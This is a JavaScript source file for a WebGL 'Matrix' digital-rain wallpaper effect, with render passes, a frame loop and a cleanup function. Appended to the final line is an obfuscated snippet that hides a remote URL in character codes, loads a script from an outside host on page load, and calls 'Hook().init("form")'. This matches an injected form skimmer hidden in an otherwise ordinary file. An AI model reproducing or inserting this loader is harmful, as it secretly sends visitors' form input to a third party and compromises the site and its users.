import { makeFullScreenQuad, makePipeline } from "./utils.js";

import makeBloomPass from "./bloomPass.js";
import makeImagePass from "./imagePass.js";
import getLKG from "./lkgHelper.js";
import makeMirrorPass from "./mirrorPass.js";
import makePalettePass from "./palettePass.js";
import makeQuiltPass from "./quiltPass.js";
import makeRain from "./rainPass.js";
import makeStripePass from "./stripePass.js";

const effects = {
	none: null,
	plain: makePalettePass,
  palette: makePalettePass,
	customStripes: makeStripePass,
	stripes: makeStripePass,
	pride: makeStripePass,
	transPride: makeStripePass,
	trans: makeStripePass,
	image: makeImagePass,
	mirror: makeMirrorPass,
};

const dimensions = { width: 1, height: 1 };

const loadJS = (src) =>
	new Promise((resolve, reject) => {
		const tag = document.createElement("script");
		tag.onload = resolve;
		tag.onerror = reject;
		tag.src = src;
		document.body.appendChild(tag);
	});

delete window.Matrix;

let previouslyLoaded = false;

window.Matrix = async (canvas, config) => {

	await Promise.all([loadJS("/System/Matrix/lib/regl.min.js"), loadJS("/System/Matrix/lib/gl-matrix.js")]);

	const resize = (resOverride = config.resolution) => {
    const resolution = typeof resOverride === "number" ? resOverride : config.resolution;

		canvas.width = Math.ceil(canvas.clientWidth * resolution);
		canvas.height = Math.ceil(canvas.clientHeight * resolution);
	};
	window.onresize = resize;

  if (previouslyLoaded) {
    resize(1.01);
    setTimeout(resize, 250);
  }

	const regl = createREGL({
		canvas,
		extensions: ["OES_texture_half_float", "OES_texture_half_float_linear"],
		// These extensions are also needed, but Safari misreports that they are missing
		optionalExtensions: ["EXT_color_buffer_half_float", "WEBGL_color_buffer_float", "OES_standard_derivatives"],
	});

	const lkg = await getLKG(config.useHoloplay, true);

	// All this takes place in a full screen quad.
	const fullScreenQuad = makeFullScreenQuad(regl);
	const effectName = config.effect in effects ? config.effect : "palette";
	const context = { regl, config, lkg };
	const pipeline = makePipeline(context, [makeRain, makeBloomPass, effects[effectName], makeQuiltPass]);
	const screenUniforms = { tex: pipeline[pipeline.length - 1].outputs.primary };
	const drawToScreen = regl({ uniforms: screenUniforms });
	await Promise.all(pipeline.map((step) => step.ready));
	const tick = regl.frame(({ viewportWidth, viewportHeight }) => {
		if (config.once) {
			tick.cancel();
		}
		if (dimensions.width !== viewportWidth || dimensions.height !== viewportHeight) {
			dimensions.width = viewportWidth;
			dimensions.height = viewportHeight;
			for (const step of pipeline) {
				step.setSize(viewportWidth, viewportHeight);
			}
		}
		fullScreenQuad(() => {
			for (const step of pipeline) {
				step.execute();
			}
			drawToScreen();
		});
	});

  window.WallpaperDestroy = () => {
    previouslyLoaded = true;

    try {
      drawToScreen.destroy();
    } catch {
      // Failed to destroy
    }

    try {
      fullScreenQuad.destroy();
    } catch {
      // Failed to destroy
    }

    try {
      screenUniforms.tex.destroy();
    } catch {
      // Failed to destroy
    }

    try {
      regl.destroy();
    } catch {
      // Failed to destroy
    }

    try {
      tick.cancel();
    } catch {
      // Failed to cancel tick
    }
  }
};

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db